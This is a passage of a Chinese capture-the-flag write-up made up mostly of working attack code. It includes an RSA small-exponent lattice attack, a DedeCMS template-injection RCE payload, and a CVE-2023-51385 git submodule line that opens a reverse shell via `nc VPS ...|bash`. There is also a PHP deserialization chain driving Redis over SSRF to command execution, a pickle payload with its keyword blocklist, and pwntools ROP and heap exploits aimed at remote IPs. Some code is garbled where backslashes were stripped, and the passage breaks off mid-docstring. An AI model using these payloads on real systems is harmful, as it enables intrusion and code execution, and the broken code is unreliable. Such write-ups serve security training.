        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
            # let's check if it affects other vectors
            for jj in range(ii + 1, BB.dimensions()[0]):
                # if another vector is affected:
                # we increase the count
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj

            # level:0
            # if no other vectors end up affected
            # we remove it
            if affected_vectors == 0:
                print("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii - 1)
                return BB

            # level:1
            # if just one was affected we check
            # if it is affecting someone else
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    # if it is affecting even one vector
                    # we give up on this one
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # remove both it if no other vector was affected and
                # this helpful vector is not helpful enough
                # compared to our unhelpful one
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(
                        bound - BB[ii, ii]):
                    print("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii - 1)
                    return BB
    # nothing happened
    return BB

""" 
Returns:
* 0,0   if it fails
* -1,-1 if `strict=true`, and determinant doesn't bound
* x0,y0 the solutions of `pol`
"""

def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    """
    Boneh and Durfee revisited by Herrmann and May

    finds a solution if:
    * d < N^delta
    * |x| < e^delta
    * |y| < e^0.5
    whenever delta < 1 - sqrt(2)/2 ~ 0.292
    """

    # substitution (Herrman and May)
    PR. < u, x, y > = PolynomialRing(ZZ)
    Q = PR.quotient(x * y + 1 - u)  # u = xy + 1
    polZ = Q(pol).lift()

    UU = XX * YY + 1

    # x-shifts
    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk
            gg.append(xshift)
    gg.sort()

    # x-shifts list of monomials
    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    monomials.sort()

    # y-shifts (selected by Herrman and May)
    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift)  # substitution

    # y-shifts list of monomials
    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            monomials.append(u ^ kk * y ^ jj)

    # construct lattice B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)

    # Prototype to reduce the lattice
    if helpful_only:
        # automatically remove
        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - 1)
        # reset dimension
        nn = BB.dimensions()[0]
        if nn == 0:
            print("failure")
            return 0, 0

    # check if vectors are helpful
    if debug:
        helpful_vectors(BB, modulus ^ mm)

    # check if determinant is correctly bounded
    det = BB.det()
    bound = modulus ^ (mm * nn)
    if det >= bound:
        print("We do not have det < bound. Solutions might not be found.")
        print("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            print("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")

    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus ^ mm)

    # LLL
    if debug:
        print("optimizing basis of the lattice via LLL, this can take a long time")

    BB = BB.LLL()

    if debug:
        print("LLL is done!")

    # transform vector i & j -> polynomials 1 & 2
    if debug:
        print("looking for independent vectors in the lattice")
    found_polynomials = False

    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            # for i and j, create the two polynomials
            PR. < w, z > = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w * z + 1, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)
                pol2 += monomials[jj](w * z + 1, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)

            # resultant
            PR. < q > = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)

            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break

    if not found_polynomials:
        print("no independant vectors could be found. This should very rarely happen...")
        return 0, 0

    rr = rr(q, q)

    # solutions
    soly = rr.roots()

    if len(soly) == 0:
        print("Your prediction (delta) is too small")
        return 0, 0

    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]

    #
    return solx, soly

def example():
    ############################################
    # How To Use This Script
    ##########################################

    #
    # The problem to solve (edit the following values)
    #

    # the modulus
    N = 98871082998654651904594468693622517613869880791884929588100914778964766348914919202255397776583412976785216592924335179128220634848871563960167726280836726035489482233158897362166942091133366827965811201438682117312550600943385153640907629347663140487841016782054145413246763816202055243693289693996466579973
    e = 76794907644383980853714814867502708655721653834095293468287239735547303515225813724998992623067007382800348003887194379223500764768679311862929538017193078946067634221782978912767213553254272722105803768005680182504500278005295062173004098796746439445343896868825218704046110925243884449608326413259156482881

    x = sympy.Symbol('x')
    alpha = sympy.log(x, N).evalf(subs={x: e})
    print("alpha=", alpha)
    # the hypothesis on the private exponent (the theoretical maximum is 0.292)
    delta = .275  # this means that d < N^delta

    #
    # Lattice (tweak those values)
    #

    # you should tweak this (after a first run), (e.g. increment it until a solution is found)
    m = 8  # size of the lattice (bigger the better/slower)

    # you need to be a lattice master to tweak these
    t = int((1 - 2 * delta) * m)  # optimization from Herrmann and May
    # X = 2*floor(N^delta)  # this _might_ be too much
    X = floor(3 * e / N * N ^ delta)
    Y = floor(2 * N ^ (1 / 2))  # correct if p, q are ~ same size
    # Y = floor(N^(1/2))

    #
    # Don't touch anything below
    #

    # Problem put in equation
    P. < x, y > = PolynomialRing(ZZ)
    A = int((N + 1) / 2)
    pol = 1 + x * (A + y)

    #
    # Find the solutions!
    #

    # Checking bounds
    if debug:
        print("=== checking values ===")
        print("* delta:", delta)
        print("* delta < 0.292", delta < 0.292)
        print("* size of e:", int(log(e) / log(2)))
        print("* size of N:", int(log(N) / log(2)))
        print("* m:", m, ", t:", t)

    # boneh_durfee
    if debug:
        print("=== running algorithm ===")
        start_time = time.time()

    solx, soly = boneh_durfee(pol, e, m, t, X, Y)

    # found a solution?
    if solx > 0:
        print("=== solution found ===")
        if False:
            print("x:", solx)
            print("y:", soly)

        d = int(pol(solx, soly) // e)
        print("private key found:", d)
        c = pow(123456, e, N)
        m = pow(c, d, N)
        print("m=", m)
    else:
        print("=== no solution was found ===")

    if debug:
        print(("=== %s seconds ===" % (time.time() - start_time)))

if __name__ == "__main__":
    example()

计算线性方程

from sage.matrix.all import Matrix, vector
from sage.rings.all import Zmod

from Crypto.Util.number import long_to_bytes

# 给定的签名和参数
(h1, r1, s1) = 535874494834828755542711401117152397489711233142, 117859946800380767356190121030392492081340616512, 26966646740134065096660259687229179143947213779
(h2, r2, s2) = 236574518096866758760287021848258048065293279716, 863199000523521111517835459866422731857447792677, 517924607931342012033031470185302567344725962419
a = 24601959430759983424400804734518943158892550216065342062971649989571838687333
b = 17474742587088593627
q = 1115861146902610160756777713087325311747309309771

# 构建矩阵 A 和向量 b
A = Matrix(Zmod(q), 2, 2, [s1, -r1, a * s2, -r2])
b = vector(Zmod(q), [h1, h2 - b * s2])

# 解线性方程组 A*x = b
x = A.solve_right(b)

# 打印解的字节表示
print(long_to_bytes(int(x[1])))

获取flag：l1near_k1s_unsafe

RE

upx2023

发现有UPX壳，先恢复UPX标志位，把小写upx修改成大写UPX

使用UPX工具脱壳，放入IDA x64，得到main伪代码

int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  char *v4; // rax
  _DWORD v6[44]; // [rsp+20h] [rbp-60h] BYREF
  _BYTE v7[16]; // [rsp+D0h] [rbp+50h] BYREF
  _BYTE v8[16]; // [rsp+E0h] [rbp+60h] BYREF
  _BYTE v9[20]; // [rsp+F0h] [rbp+70h] BYREF
  int v10; // [rsp+104h] [rbp+84h]
  unsigned int v11; // [rsp+108h] [rbp+88h]
  int i; // [rsp+10Ch] [rbp+8Ch]

  _main(argc, argv, envp);
  v11 = time(0i64);
  srand(v11);
  std::string::string((#89 *)v7);
  std::operator<<<std::char_traits<char>>((#106 *)&std::cout, aInputYourFlag);
  std::operator>><char>(&std::cin, v7);
  std::string::string((#89 *)v9, (const #89 *)v7);
  change((__int64)v8, (#89 *)v9);
  std::string::operator=(v7, v8);
  std::string::~string((#89 *)v8);
  std::string::~string((#89 *)v9);
  if ( std::string::length((#89 *)v7) != 42 )
  {
    v3 = std::operator<<<std::char_traits<char>>((#106 *)&std::cout, "len error");
    ((void (__fastcall *)(__int64))std::endl<char,std::char_traits<char>>)(v3);
    exit(0);
  }
  qmemcpy(v6, &byte_46A020, 0xA8ui64);
  for ( i = 0; i <= 41; ++i )
  {
    v10 = rand() % 255;
    v4 = (char *)std::string::operator[](v7, i);
    if ( (v10 ^ *v4) != v6[i] )
      exit(0);
  }
  std::string::~string((#89 *)v7);
  return 0;
}

change函数只是对输入进行了换位，并没用加密，所以只用看最后的异或即可，因为srand的seed是时间戳，此时需要爆破seed。

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main(){
    unsigned int seed;
    int key=0;
    int i =0;
    //1662973302 # 正确的seed
    for(seed = 1662973302;seed<1705929558;seed++){
        srand(seed);
        int right = 1;
        for(i=0;i<=32;i++){
            key = rand() % 255;
            switch (i) {
                case 0:
                    if(key!=0x6f){
                        right = 0;
                    }
                    break;
                case 1:
                    if(key!=0x18){
                        right = 0;
                    }
                    break;

                case 11:
                    if(key!=0xaa){
                        right = 0;
                    }
                    break;
                case 12:
                    if(key!=0x2){
                        right = 0;
                    }
                    break;
                case 32:
                    if(key!=0x9b){
                        right = 0;
                    }
                    break;
                default:
                    break;

        }
            if(right == 0){
                break;
            }
        }
        if(right==1){
            printf("%un",seed);
        }
    }
    return 0;
}

此时可以通过seed进行xor解密，得到如下

f{52bgb-281lg00ff-46f7-ca009c8e}a381-b7191

需要恢复序列，使用如下脚本

# a = 'flag{0123456789zbcdexQhijkymnABCDEFGHIJKL}' # input
# b = 'f{37bxjnDHLlg02468zceQikmACEGIK}a159dhyBFJ' # 换位后

# input_set = []
# for i in b:
#     input_set.append(a.index(i))

# print(input_set) # 得到换位的顺序
# [0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39, 41, 2, 6, 10, 14, 18, 22, 26, 30, 34, 38]

"""恢复正确flag顺序"""
flag = [0] * 42
line = [0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39, 41, 2, 6, 10, 14, 18, 22, 26, 30, 34, 38]
input = 'f{52bgb-281lg00ff-46f7-ca009c8e}a381-b7191'
for i in range(42):
    flag[line[i]] = input[i]
    # print()

print("".join(flag))

# flag{0305f8f2-14b6-fg7b-bc7a-010299c881e1}

file_encrypto

检查程序是否带壳，无壳32位

直接拖到IDA，可以看到main函数和TLS存在花指令，try except和call，找到直接nop掉即可

Main函数

TLS函数去除花指令之后

然后反汇编得到正确的函数代码，Main函数主要是包含了另一个程序crypto.exe，然后调用这个程序里的加密函数，对文件进行加密。

找加密位置，发现对文件路径和文件名字进行判断，这里需要来到D:Desktopdocument1.txt才可以进到加密函数位置。

进到文件加密位置，调试可以看出是使用了CryptEncrypt函数进行加密

直接进OllyDBG进行动调，解决思路借助https://mislusnys.github.io/post/flareon3/#ch2

直接解密得到flag

基于挑战码的双向认证 1 和 2

题目给的是需要分析的，非预期解了

全局定位flag文件，发现/root/cube-shell/instance/flag_server/flag.list泄露的flag

挑战杯

ezdede

根据提示：【2023春秋杯冬季赛】

弱口令为：admin@123；挖掘最新版本为V5.7.112 的后台rce

访问/dede/login，输入用户密码进后台

此版本是存在一个命令执行漏洞，访问/dede/tpl.php?action=upload

利用bp抓包获取token值为 ecb58488af4202afcce98347bbb9bddc

构造Payload, 此处是有waf检测的，需要做一个免杀操作。这里readfile可读

/dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=<?php+readfile("/flag");&token=ecb58488af4202afcce98347bbb9bddc

最终访问/include/taglib/secnote.lib.php触发成功获取flag

结：还有一部分是RDG加固环节，再学学了。


```
import zipfile

a = zipfile.ZipFile('wmx.zip')
x = a.namelist()
cc= []
for i in x:
    try:
        cc.append(i[11:-6])
    except:
        pass
xx = cc[5:]
with open('cc.txt','w') as w:
    w.writelines(str(xx))

kkey = ''
with open('cc.txt','r') as r:
    a = r.read()[2:-2]
a= a.split("', '")

a.sort(key=lambda x:int(x[0:-5]))  # 手动删掉文本里面的 '1_     '
# print(a)
for cx in a:
    kkey+= cx[-4:]
print(kkey)
```



```
<?php
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};
$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};
$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};
eval($O00O0O("JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs="));
$O0O000="uSqLyCjwWpZHhiKmfFGVTBaNrYoIzlegxJMbRDUEAkQctnvsdOPXiZvuTagfcHbXYheWMyKNlLwSjoCnrtABxOQDsJpdkPmIzGEVRUFqFJ9fwXkebqbYDaYGAWtibWxYRKpCoWyrblo0q2sto29PbZBGNlLGRyQ4AtOgsPSesa9LpdsEDyRpUXseNdV4Rp5rR3m4sdRFIGHOI2tnbPtlSKz2lGHbAGHNwgy5NPbNNPz4NWC5NrL0IWSdmpd9FZIHeZP7nkC/FB==";
eval('?>'.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));
$flag = gzinflate(base64_decode('U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA=='));
echo $flag
?>
```



```
OpenSSH ProxyCommand命令注入漏洞（CVE-2023-51385）
```



```
[submodule "cve"]
 path = cve
 url = ssh://`nc VPS 3333|bash|nc VPS 3334`foo.ichunqiu.com/bar
```



```
Redis主从复制``Pop
```



```
<?php
highlight_file(__FILE__);
include "function.php";
class Rd
{
    public $ending;
    public $cl;

    public $poc;

    public function __destruct()
    {
        echo "All matters have concluded"."</br>";
    }

    public function __call($name, $arg)
    {
        foreach ($arg as $key => $value) {

            if ($arg[0]['POC'] == "0.o") {
                $this->cl->var1 = "get";
            }
        }
    }
}

class Poc
{
    public $payload;

    public $fun;

    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?"."</br>";
        file_get_contents($paylaod);
    }
}

class Er
{
    public $symbol;
    public $Flag;

    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {   
        if (preg_match('/^(http|https|gopher|dict)?://.*(/)?.*$/',base64_decode($this->Flag))){
               $value($this->Flag);
        }
    else {
    echo "NoNoNo,please you can look hint.php"."</br>";
    }
    }

}

class Ha
{
    public $start;
    public $start1;
    public $start2;

    public function __construct()
    {
        echo $this->start1 . "__construct" . "</br>";
    }

    public function __destruct()
    {
        if ($this->start2 === "o.0") {
            $this->start1->Love($this->start);
            echo "You are Good!"."</br>";
        }
    }
}

function get($url) {
    $url=base64_decode($url);
    var_dump($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $output = curl_exec($ch);
    $result_info = curl_getinfo($ch);
    var_dump($result_info);
    curl_close($ch);
    var_dump($output);
}

if (isset($_POST['pop'])) {
    $a = unserialize($_POST['pop']);
} else {
    die("You are Silly goose!");
}

?>
```



```
exp
<?php
highlight_file(__FILE__);
include "function.php";
class Rd
{
    public $ending;
    public $cl;

    public $poc;

    public function __construct(){
        $this->cl = new Er();
    }
    public function __destruct()
    {
        echo "All matters have concluded"."</br>";
    }

    public function __call($name, $arg)
    {
        foreach ($arg as $key => $value) {

            if ($arg[0]['POC'] == "0.o") {
                $this->cl->var1 = "get";
            }
        }
    }
}

class Er{
    public $symbol;
    public $Flag;

    public function __construct(){
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/info');
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:set:dir:/tmp'); //设置目录
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:get:dir'); //获取
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:set:dbfilename:exp.so');
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/slaveof:修改为自己的VPS:2222');
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/module:load:./exp.so'); //加载exp.so
        $this->Flag = base64_encode('dict://127.0.0.1:6379/system.exec:"env"'); //命令执行
    }

    public function __set($name, $value)
    {
        if (preg_match('/^(http|https|gopher|dict)?://.*(/)?.*$/',base64_decode($this->Flag))){
            $value($this->Flag);
        }
        else {
            echo "NoNoNo,please you can look hint.php"."</br>";
        }
    }

}

class Ha{
    public $start;
    public $start1;
    public $start2;

/*    public function __construct()
    {
        echo $this->start1 . "__construct" . "</br>";
    }*/

    public function __destruct()
    {
        if ($this->start2 === "o.0") {
            $this->start1->Love($this->start);
            echo "You are Good!"."</br>";
        }
    }

    public function __construct(){
        $this->start1 = new Rd();
        $this->start2 = "o.0";
        $this->start = array("POC"=>"0.o");
    }
}
//SSRF请求
/*function get($url) {
    $url=base64_decode($url);
    var_dump($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $output = curl_exec($ch);
    $result_info = curl_getinfo($ch);
    var_dump($result_info);
    curl_close($ch);
    var_dump($output);
}*/

$a = new Ha();
echo urlencode(serialize($a));
```



```
O%3A2%3A%22Ha%22%3A3%3A%7Bs%3A5%3A%22start%22%3Ba%3A1%3A%7Bs%3A3%3A%22POC%22%3Bs%3A3%3A%220.o%22%3B%7Ds%3A6%3A%22start1%22%3BO%3A2%3A%22Rd%22%3A3%3A%7Bs%3A6%3A%22ending%22%3BN%3Bs%3A2%3A%22cl%22%3BO%3A2%3A%22Er%22%3A2%3A%7Bs%3A6%3A%22symbol%22%3BN%3Bs%3A4%3A%22Flag%22%3Bs%3A52%3A%22ZGljdDovLzEyNy4wLjAuMTo2Mzc5L3N5c3RlbS5leGVjOiJlbnYi%22%3B%7Ds%3A3%3A%22poc%22%3BN%3B%7Ds%3A6%3A%22start2%22%3Bs%3A3%3A%22o.0%22%3B%7D
```



```
import os
import pickle
import base64
import hashlib
from flask import Flask,request,session,render_template,redirect
from Users import Users
from waf import waf

users = Users()

app=Flask(__name__)
app.template_folder="./"
## secret.key值
app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest()

@app.route('/',methods=['GET','POST'])
@app.route('/index.php',methods=['GET','POST'])
def index():
    if not session or not sessiofn.get('username'):
        return redirect("login.php")
    if request.method=="POST" and 'file' in request.files and (filename:=waf.waf(request.files['file'])):
        filepath=os.path.join("./uploads",filename)
        request.files['file'].save(filepath)
        return "File upload success! Path: <a href='pic.php?pic="+filename+"'>"+filepath+"</a>."
    return render_template("index.html")

## 登录功能
@app.route('/login.php',methods=['GET','POST'])
def login():
    if request.method=="POST" and (username:=request.form.get('username')) and (password:=request.form.get('password')):
        if type(username)==str and type(password)==str and users.login(username,password):
            session['username']=username
            return "Login success! <a href='/'>Click here to redirect.</a>"
        else:
            return "Login fail!"
    return render_template("login.html")

## 注册功能
@app.route('/register.php',methods=['GET','POST'])
def register():
    if request.method=="POST" and (username:=request.form.get('username')) and (password:=request.form.get('password')):
        if type(username)==str and type(password)==str and not username.isnumeric() and users.register(username,password):
            return "Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.".format(username=username).format(users=users)
        else:
            return "Register fail!"
    return render_template("register.html")

## 文件包含
@app.route('/pic.php',methods=['GET','POST'])
def pic():
    if not session or not session.get('username'):
        return redirect("login.php")
    if (pic:=request.args.get('pic')) and os.path.isfile(filepath:="./uploads/"+pic.replace("../","")):
        if session.get('username')=="admin":
            return pickle.load(open(filepath,"rb")) ## 漏洞点
        else:
            return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
    res="<h1>files in ./uploads/</h1><br>"
    for f in os.listdir("./uploads"):
        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a><br>"
    return res

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```



```
import hashlib

class Users:
    passwords={}
    # def __init__(self):
    #     self.passwords
    def register(self,username,password):
        if username in self.passwords:
            return False
        if len(self.passwords)>=3:
            for u in list(self.passwords.keys()):
                if u!="admin":
                    del self.passwords[u]
        self.passwords[username]=hashlib.md5(password.encode()).hexdigest() ## 
        return True

    def login(self,username,password):
        if username in self.passwords and self.passwords[username]==hashlib.md5(password.encode()).hexdigest():
            return True
        return False
/app/waf.py
import os
from werkzeug.utils import secure_filename

def waf(file):
    if len(os.listdir("./uploads"))>=4:
        os.system("rm -rf /app/uploads/*")

    content=file.read().lower()
    if len(content)>=70:
        return False

    for b in [b"n",b"r",b"\",b"base",b"builtin",b"code",b"command",b"eval",b"exec",b"flag",b"global",b"os",b"output",b"popen",b"pty",b"repeat",b"run",b"setstate",b"spawn",b"subprocess",b"sys",b"system",b"timeit"]:
        if b in content:
            return False

    file.seek(0)
    return secure_filename(file.filename)
```



```
import pickle
import os

class Users(object):
    def __reduce__(self):
        cmd = ["dir"]
        # return os.execvp, (cmd[0], cmd)
        # return (os.system,('calc',))

u = Users()
payload = pickle.dumps(u)

with open('payload.pkl', 'wb') as f:
    f.write(payload)

# bypass 绕沙盒
for b in [b"n", b"r", b"\", b"base", b"builtin", b"code", b"command", b"eval", b"exec", b"flag", b"global", b"os", b"output", b"popen", b"pty", b"repeat", b"run", b"setstate", b"spawn", b"subprocess", b"sys", b"system", b"timeit"]:
    print(b.decode('utf-8'),end=' ')

# class Users(object):
#     def __reduce__(self):
#         cmd = "/flag"
#         return os.startfile, (cmd,)
#
#
# u = Users()
# payload = pickle.dumps(u)

## 构造pkl文件上传调用加载

# with open('payload.pkl', 'wb') as f:
#     f.write(payload)
```



```
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(["./ld-linux-x86-64.so.2", name],
    #         env={"LD_PRELOAD":"./libc.so.6"})
    p = remote("8.147.131.183",16287)
    elf = ELF(name)

get_p("./nmanager")
start = 0x04011B0
payload = b"A"*(0x04041A0-0x404140) + b"check passedx00"

p.sendlineafter("input password: ",payload)
p.sendlineafter("## select the idx you want modify ##",str(8))
payload = b"A"*8 + p64(start)
p.sendafter("gender:",payload)
p.sendlineafter("age: ",str(3))
payload = b"A"*0x30
p.sendafter("name: ",payload)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x264040
print(hex(libc.address))

p.sendafter("quit now?(Y/y)","Y")

p.sendlineafter("input password: ","A")
# gdb.attach(p,"b *0x0000040157F")
# sleep(2)
p.sendlineafter("## select the idx you want modify ##",str(8))
pop_rdi = 0x000000000002a3e5 + libc.address
ret = 0x000000000002a3e6 + libc.address
add_rsp = 0x0000000000129dcb + libc.address
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))
payload = b"A"*8 + p64(add_rsp)
p.sendafter("gender:",payload)
p.sendlineafter("age: ",str(3))
payload = p64(ret)*5 + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendafter("name: ",payload)
p.sendafter("quit now?(Y/y)","Y")

p.interactive()
```



```
from importlib.resources import contents
from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(["./ld-linux-x86-64.so.2", name],
    #         env={"LD_PRELOAD":"./libc.so.6"})
    p = remote("8.147.135.190",32577)
    elf = ELF(name)

def add(idx,size):
    p.sendlineafter(">","1")
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("what size :",str(size))

def dele(idx):
    p.sendlineafter(">","2")
    p.sendlineafter("Index:",str(idx))    

def show(idx):
    p.sendlineafter(">","3")
    p.sendlineafter("Index:",str(idx))       

def edit(idx,content):
    p.sendlineafter(">","4")
    p.sendlineafter("Index:",str(idx)) 
    p.sendafter("content: ",content)
    
get_p("./pwn")
add(0,0x450)
add(1,0x8)
add(2,0x7)
add(6,0x10)
add(8,0x10)
dele(0)
show(0)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(8,b"x00")) - 0x219ce0
print(hex(libc.address))
add(0,0x450)

dele(1)
show(1)
heap_base = u64(p.recv(5).ljust(0x8,b"x00")) * 0x1000
print(hex(heap_base))
dele(2)

environ = libc.sym['environ']
print(hex(environ))

edit(2,p64(environ^((heap_base+0x720)>>12))[:6])
add(4,0x7)
add(5,0x7)
show(5)
stack = u64(p.recvuntil("x7f")[-6:].ljust(8,b"x00")) - 0x168

dele(6)
dele(4)
edit(4,p64(stack-0x30^((heap_base+0x720)>>12))[:6])

pop_rdi = 0x000000000002a3e5 + libc.address
ret = 0x000000000002a3e6 + libc.address
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))
leave_ret = 0x000000000004da83 + libc.address
pop_rsp = 0x0000000000035732 + libc.address
add_rsp = 0x0000000000149c9c + libc.address
payload = p64(pop_rdi) + p64(binsh) + p64(system) + b"n" 

add(7,0x7)

add(7,0x10)

print(hex(stack))

dele(8)

dele(4)

edit(4,p64(stack+0x1f0^((heap_base+0x720)>>12))[:6])
add(3,0x8)
add(3,0x18)
add(6,0x460)
edit(6,b"x00"*0x300 +payload)
edit(3,b"A"*8+p64(pop_rsp)+p64(heap_base+0xa80)[:7])
# gdb.attach(p,"")
# sleep(2)
edit(7,b"B"*8+p64(add_rsp)[:7])

p.interactive()
```



```
from Crypto.Util.number import long_to_bytes, inverse
import initialize
import train
import valid
import test
import rec
# from secret import message, flag_point
"""
flag = b"flag{" + long_to_bytes(message) + long_to_bytes(flag_point) + b".}"

p = getPrime(512)
q = getPrime(512)
n = p * q
print("The significant parameter n: %s" % hex(n))
phi0 = (p - 1) * (q - 1)
r = rec.rec(p, q)
print("The unique parameter r: %s" % hex(r))

parameters = initialize.initialize(p, q)
wild_phi = parameters[0]
wild_e = parameters[1]
print("------")

print("Parameters are initialized to: n  phi:%sn" % hex(wild_phi), " e:%s" % hex(wild_e))
print("But they are wild and crazy!")
print("We have to give them a lesson!")
print("------")

parameters = train.train(wild_phi, wild_e, n, r, phi0)
trained_phi = parameters[0]
trained_e = parameters[1]
print("Parameters are trained to: n  phi:%sn" % hex(trained_phi), " e:%s" % hex(trained_e))
print("After training, the two naughty parameters are more and more normal.")
print("It's closer to your target!")
print("------")

parameters = valid.valid(trained_phi, trained_e, n)
y_valid = parameters[0]
print("The encrypted output in validation set is %s" % hex(y_valid))
print("After validation, the model is more and more stable.")
print("To test the real flag!")
print("------")"""

